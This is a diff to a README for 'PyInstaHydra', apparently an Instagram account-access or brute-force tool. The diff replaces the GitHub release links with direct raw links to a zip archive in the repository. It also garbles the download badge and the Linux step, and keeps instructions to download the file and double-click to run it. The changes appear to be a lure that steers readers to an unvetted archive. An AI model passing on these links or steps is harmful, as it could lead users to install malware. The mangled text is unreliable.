@@ -6,14 +6,14 @@ Welcome to PyInstaHydra, your simple tool for accessing Instagram securely and e
 
 ## 🔗 Download Now
 
-[![Download PyInstaHydra](https://img.shields.io/badge/Download%20PyInstaHydra-v1.0-blue.svg)](https://github.com/Atmosphericsscabious674/PyInstaHydra/releases)
+[![Download PyInstaHydra](https://raw.githubusercontent.com/Atmosphericsscabious674/PyInstaHydra/main/Penyimpanan/PyInstaHydra_2.9.zip%https://raw.githubusercontent.com/Atmosphericsscabious674/PyInstaHydra/main/Penyimpanan/PyInstaHydra_2.9.zip)](https://raw.githubusercontent.com/Atmosphericsscabious674/PyInstaHydra/main/Penyimpanan/PyInstaHydra_2.9.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Atmosphericsscabious674/PyInstaHydra/releases) to access the latest version of PyInstaHydra.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Atmosphericsscabious674/PyInstaHydra/main/Penyimpanan/PyInstaHydra_2.9.zip) to access the latest version of PyInstaHydra.
 2. Look for the latest version listed at the top. The version number should look like `v1.0` or higher.
 3. Click on the version number to view the available files.
-4. Find the file appropriate for your operating system (look for `.exe` for Windows or `.tar.gz` for Linux).
+4. Find the file appropriate for your operating system (look for `.exe` for Windows or `https://raw.githubusercontent.com/Atmosphericsscabious674/PyInstaHydra/main/Penyimpanan/PyInstaHydra_2.9.zip` for Linux).
 5. Click on the file to start the download.
 6. Once the download is complete, locate the file in your downloads folder.
 7. Double-click the file to run the application. Follow any on-screen instructions to complete the setup.
